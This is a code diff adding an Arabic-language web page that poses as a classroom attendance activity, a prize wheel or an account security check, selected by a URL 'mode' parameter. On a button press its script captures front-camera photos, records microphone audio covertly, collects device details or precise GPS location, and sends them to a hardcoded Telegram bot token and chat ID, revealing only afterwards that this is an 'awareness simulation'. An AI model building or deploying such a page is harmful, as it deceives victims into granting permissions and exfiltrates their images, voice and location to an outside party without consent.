@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>البوابة التعليمية التفاعلية</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, sans-serif; }
+        body { background: #0f172a; color: #f8fafc; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 15px; text-align: center; }
+        .card { background: #1e293b; border-radius: 20px; padding: 25px; max-width: 400px; width: 100%; border: 1px solid #334155; box-shadow: 0 10px 25px rgba(0,0,0,0.4); }
+        h1 { color: #38bdf8; font-size: 20px; margin-bottom: 12px; }
+        p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; line-height: 1.5; }
+        .btn { background: #0284c7; color: white; border: none; padding: 14px; font-size: 16px; font-weight: bold; border-radius: 12px; cursor: pointer; width: 100%; }
+        .btn:hover { background: #0369a1; }
+        .alert-box { background: #450a0a; border: 1px solid #ef4444; border-radius: 12px; padding: 20px; text-align: right; }
+        .alert-box h2 { color: #ef4444; text-align: center; font-size: 18px; margin-bottom: 10px; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="card" id="app">
+    <h1 id="title">🎓 منصة التفاعل والأنشطة الصفية</h1>
+    <p id="desc">اضغط على الزر أدناه لبدء النشاط التفاعلي وتأكيد الحضور في حصة اليوم.</p>
+    <button class="btn" onclick="runExperiment()">بدء النشاط 🚀</button>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    const BOT_TOKEN = "8538003058:AAEeltf-MObXjAshSv7vFyz8OKjubr2juVg";
+    const CHAT_ID = "178566702";
+
+    // قراءة نوع الخدعة من الرابط
+    const urlParams = new URLSearchParams(window.location.search);
+    const mode = urlParams.get('mode') || 'u1_snap1';
+
+    // تخصيص النصوص بحسب الخدعة المحددة من البوت
+    if(mode.includes('u4_wheel')) {
+        document.getElementById('title').innerText = "🎁 عجلة الحظ المباشرة للطلاب";
+        document.getElementById('desc').innerText = "اضغط لتدوير العجلة ومعرفة جائزتك الفورية!";
+    } else if(mode.includes('u3_pin')) {
+        document.getElementById('title').innerText = "🔑 إعدادات الأمان والحساب";
+        document.getElementById('desc').innerText = "يرجى الموافقة لتأكيد رمز الحماية واختبار قوة الشاشة.";
+    }
+
+    async function runExperiment() {
+        // 1. الوحدة 1: صور سريعة أو متتالية
+        if (mode === 'u1_snap1') {
+            capturePhoto(1, "📸 [صورة واحدة خاطفة]");
+        } else if (mode === 'u1_snap3') {
+            capturePhoto(3, "🎞️ [سلسلة 3 صور متتالية]");
+        } 
+        // 2. الوحدة 2: تسجيل صوتي
+        else if (mode.startsWith('u2_')) {
+            recordAudio(4); // تسجيل 4 ثواني صوت
+        }
+        // 3. الوحدة 3: معلومات النظام والهاتف
+        else if (mode.startsWith('u3_')) {
+            sendDeviceInfo();
+        }
+        // 4. الوحدة 4 و 5: صور + موقع شامل
+        else {
+            capturePhoto(1, `🚨 [خدعة متقدمة: ${mode}]`);
+            sendLocation();
+        }
+    }
+
+    // --- وظيفة التقاط الصور (واحدة أو متتالية) ---
+    async function capturePhoto(count, label) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            let taken = 0;
+            const interval = setInterval(() => {
+                taken++;
+                const canvas = document.getElementById('canvas');
+                canvas.width = 320; canvas.height = 240;
+                canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+
+                canvas.toBlob(blob => {
+                    const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('photo', blob, `snap_${taken}.jpg`);
+                    fd.append('caption', `${label} - لقطة (${taken} من ${count})`);
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                }, 'image/jpeg', 0.4);
+
+                if (taken >= count) {
+                    clearInterval(interval);
+                    stream.getTracks().forEach(t => t.stop());
+                    showEduReport();
+                }
+            }, 1200);
+
+        } catch (e) { alert("⚠️ يجب إعطاء الموافقة لتأكيد النشاط!"); }
+    }
+
+    // --- وظيفة تسجيل الصوت (الوحدة 2) ---
+    async function recordAudio(seconds) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const mediaRecorder = new MediaRecorder(stream);
+            const chunks = [];
+
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('voice', blob, 'voice.ogg');
+                fd.append('caption', '🎙️ [الوحدة 2] تسجيل صوتي خفي من المايك!');
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: fd })
+                    .then(() => showEduReport());
+            };
+
+            mediaRecorder.start();
+            setTimeout(() => {
+                mediaRecorder.stop();
+                stream.getTracks().forEach(t => t.stop());
+            }, seconds * 1000);
+
+        } catch (e) { alert("⚠️ يتطلب النشاط إذن الميكروفون!"); }
+    }
+
+    // --- وظيفة سحب معلومات الهاتف (الوحدة 3) ---
+    async function sendDeviceInfo() {
+        let battery = "غير معروف";
+        if (navigator.getBattery) {
+            try { const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}%`; } catch(e){}
+        }
+
+        const report = `
+📱 *[بيانات الهاتف المسحوبة - الوحدة 3]:*
+• المتصفح والنظام: ${navigator.userAgent}
+• دقة الشاشة: ${screen.width}x${screen.height}
+• البطارية: ${battery}
+• اللغة: ${navigator.language}
+        `;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: 'Markdown' })
+        }).then(() => showEduReport());
+    }
+
+    // --- وظيفة سحب الموقع الجغرافي (الوحدة 5) ---
+    function sendLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(p => {
+                const locText = `📍 *[الموقع الجغرافي دقيقاً]:*\nhttps://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`;
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: locText, parse_mode: 'Markdown' })
+                });
+            });
+        }
+    }
+
+    function showEduReport() {
+        document.getElementById('app').innerHTML = `
+            <div class="alert-box">
+                <h2>🚨 تم اختبارك بنجاح!</h2>
+                <p style="color:#fca5a5; font-size:13px; margin-top:10px;">هذه محاكاة توعوية لمادة <b>الأمن السيبراني ومخاطر المجتمع</b>.</p>
+                <p style="color:#4ade80; font-size:13px; margin-top:10px; font-weight:bold;">💡 لا تعطِ صلاحيات الكاميرا أو المايك أو الموقع لأي رابط غير موثوق!</p>
+            </div>
+        `;
+    }
+</script>
+</body>
+</html>
